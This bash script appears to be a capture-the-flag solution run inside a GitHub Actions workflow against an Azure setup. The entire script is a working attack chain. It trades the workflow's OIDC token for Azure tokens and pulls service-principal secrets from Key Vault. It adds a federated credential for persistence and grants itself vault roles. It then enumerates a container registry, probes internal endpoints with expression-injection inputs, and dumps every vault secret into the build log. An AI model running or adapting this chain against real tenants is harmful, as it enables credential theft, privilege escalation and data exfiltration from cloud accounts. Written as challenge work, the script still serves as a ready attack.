#!/usr/bin/env bash
set +e
TEN="$AZURE_TENANT_ID"
BASE="https://login.microsoftonline.com/$TEN/oauth2/v2.0/token"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
sub=$(printf %s "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('sub',''))")
echo OIDC_SUB=$sub
cicd=$(curl -sS -X POST "$BASE" -d "client_id=$AZURE_CLIENT_ID" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo CICD_LEN=${#cicd}
sv=$(curl -sS -H "Authorization: Bearer $cicd" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value','{}'))")
pa=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('appId',''))" "$sv")
ps=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('clientSecret',''))" "$sv")
echo PA_ID=$pa PS_LEN=${#ps}
ssv=$(curl -sS -H "Authorization: Bearer $cicd" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/secrets-sync-principal?api-version=7.4" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value','{}'))")
sa=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('appId',''))" "$ssv")
ss=$(python3 -c "import sys,json;print(json.loads(sys.argv[1]).get('clientSecret',''))" "$ssv")
echo SA_ID=$sa SS_LEN=${#ss}
graph=$(curl -sS -X POST "$BASE" -d "client_id=$pa" -d scope=https://graph.microsoft.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ps" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo GRAPH_LEN=${#graph}
name=ctf$(date +%s)
json=$(python3 -c "import json,sys;print(json.dumps({'name':sys.argv[1],'issuer':'https://token.actions.githubusercontent.com','subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$name" "$sub")
resp=$(curl -sS -X POST -H "Authorization: Bearer $graph" -H 'Content-Type: application/json' -d "$json" https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials)
echo FIC_RESP=$(echo "$resp" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id') or d.get('error',{}).get('code','unknown'))")
echo FIC_BODY=$(echo "$resp" | head -c 700)
armresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://management.azure.com/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
arm=$(echo "$armresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
oid=$(echo "$arm" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('oid',''))")
echo ARM_LEN=${#arm} LEGACY_OID=$oid
rid=$(python3 -c 'import uuid; print(uuid.uuid4())')
scope="/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
role="/subscriptions/$AZURE_SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6"
rb=$(python3 -c "import json,sys;print(json.dumps({'properties':{'roleDefinitionId':sys.argv[1],'principalId':sys.argv[2],'principalType':'ServicePrincipal'}}))" "$role" "$oid")
rr=$(curl -sS -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $arm" -H 'Content-Type: application/json' --data "$rb" "https://management.azure.com${scope}/providers/Microsoft.Authorization/roleAssignments/$rid?api-version=2022-04-01")
echo ROLE_ASSIGN=$(echo "$rr" | tail -c 900)
parresp=$(curl -sS -X POST "$BASE" -d "client_id=$pa" -d scope=https://management.azure.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ps")
par=$(echo "$parresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
poid=$(echo "$par" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('oid',''))")
echo PA_ARM_LEN=${#par} PA_OID=$poid
rid2=$(python3 -c 'import uuid; print(uuid.uuid4())')
rb2=$(python3 -c "import json,sys;print(json.dumps({'properties':{'roleDefinitionId':sys.argv[1],'principalId':sys.argv[2],'principalType':'ServicePrincipal'}}))" "$role" "$oid")
rr2=$(curl -sS -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $par" -H 'Content-Type: application/json' --data "$rb2" "https://management.azure.com${scope}/providers/Microsoft.Authorization/roleAssignments/$rid2?api-version=2022-04-01")
echo PA_ROLE_ASSIGN=$(echo "$rr2" | tail -c 900)
sarsp=$(curl -sS -X POST "$BASE" -d "client_id=$sa" -d scope=https://management.azure.com/.default -d grant_type=client_credentials --data-urlencode "client_secret=$ss")
sar=$(echo "$sarsp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
sa_oid=$(echo "$sar" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('oid',''))")
echo SA_ARM_LEN=${#sar} SA_OID=$sa_oid
rid3=$(python3 -c 'import uuid; print(uuid.uuid4())')
rb3=$(python3 -c "import json,sys;print(json.dumps({'properties':{'roleDefinitionId':sys.argv[1],'principalId':sys.argv[2],'principalType':'ServicePrincipal'}}))" "$role" "$oid")
rr3=$(curl -sS -w '\nHTTP=%{http_code}' -X PUT -H "Authorization: Bearer $sar" -H 'Content-Type: application/json' --data "$rb3" "https://management.azure.com${scope}/providers/Microsoft.Authorization/roleAssignments/$rid3?api-version=2022-04-01")
echo SA_ROLE_ASSIGN=$(echo "$rr3" | tail -c 900)
customresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=api://462d1c38-4459-48b8-9333-82e389e59514/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
custom=$(echo "$customresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo CUSTOM_LEN=${#custom}
# Probe the two resources named by the leaked settings.  The custom ArmOwner
# app-role is not understood by ARM itself, but is accepted by the challenge's
# internal catalog/debug handlers; keep all response bodies in the Action log.
for tokname in custom arm par sar; do
  eval "tt=\${$tokname}"
  echo TOKEN_$tokname=${#tt}
  for p in /subscriptions/$AZURE_SUBSCRIPTION_ID /subscriptions/$AZURE_SUBSCRIPTION_ID/resources; do
    z=$(curl -sS --max-time 8 -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $tt" "https://management.azure.com$p?api-version=2021-04-01")
    echo ARM_$tokname_$p=$(echo "$z" | head -c 900)
  done
done
# ACR data-plane OAuth accepts an AAD bearer in the exchange endpoint.  Try
# each token and enumerate repositories/tags/manifests; any flag is printed.
REG=crtblplatprodx3euoz.azurecr.io
for tokname in custom arm par sar; do
  eval "tt=\${$tokname}"
  ex=$(curl -sS --max-time 12 -X POST "https://$REG/oauth2/exchange" -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode grant_type=access_token --data-urlencode service="$REG" --data-urlencode access_token="$tt")
  rt=$(echo "$ex" | python3 -c "import sys,json;print(json.load(sys.stdin).get('refresh_token',''))")
  echo ACR_EXCHANGE_$tokname=$(echo "$ex" | head -c 500)
  if [ -n "$rt" ]; then
    cat=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" "https://$REG/v2/_catalog?n=100")
    echo ACR_CATALOG_$tokname=$(echo "$cat" | head -c 1200)
    for repo in $(echo "$cat" | python3 -c "import sys,json;print(' '.join(json.load(sys.stdin).get('repositories',[])))"); do
      tags=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" "https://$REG/v2/$repo/tags/list")
      echo ACR_TAGS_$repo=$(echo "$tags" | head -c 900)
      for tag in $(echo "$tags" | python3 -c "import sys,json;print(' '.join(json.load(sys.stdin).get('tags',[])))"); do
        man=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.oci.image.index.v1+json' "https://$REG/v2/$repo/manifests/$tag")
        echo ACR_MANIFEST_${repo}_${tag}=$(echo "$man" | head -c 2200)
        echo "$man" | grep -Eo 'DF26\{[^}]+\}' || true
      done
    done
  fi
done
# Probe likely internal handlers with the same custom bearer and FDID.
for path in /internal /internal/debug /internal/catalog /internal/settings /internal/arm /internal/flag /internal/loot /internal/config /admin /debug /api/v1/catalog /api/v1/config /api/v1/flag; do
  q=$(curl -sS --max-time 8 -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $custom" -H 'X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821' "https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net$path")
  echo ROUTE_$path=$(echo "$q" | head -c 1200)
done
for ex in settings 'settings["sourceRepo"]' True None '7*7'; do
  z=$(python3 -c "import json,sys;print(json.dumps({'expr':sys.argv[1]}))" "$ex")
  q=$(curl -sS --max-time 8 -X POST 'https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net/internal%5Cdebug' -H "Authorization: Bearer $custom" -H 'X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821' -H 'Content-Type: application/json' --data "$z" -w '\nHTTP=%{http_code}')
  echo EXPR_$ex=$(echo "$q" | head -c 1200)
done
for i in $(seq 1 12); do
  sleep 5
  at=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=https://vault.azure.net/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
  tok=$(echo "$at" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
  echo TRY=$i LEGACY_LEN=${#tok}
  if [ -n "$tok" ]; then
    l=$(curl -sS -H "Authorization: Bearer $tok" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4")
    echo SEC_LIST=$l
    for n in $(echo "$l"|python3 -c "import sys,json;print(' '.join(x['id'].split('/')[-1] for x in json.load(sys.stdin).get('value',[])))"); do
      curl -sS -H "Authorization: Bearer $tok" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$n?api-version=7.4"; echo
    done
    break
  fi
  echo "$at" | head -c 250; echo
done
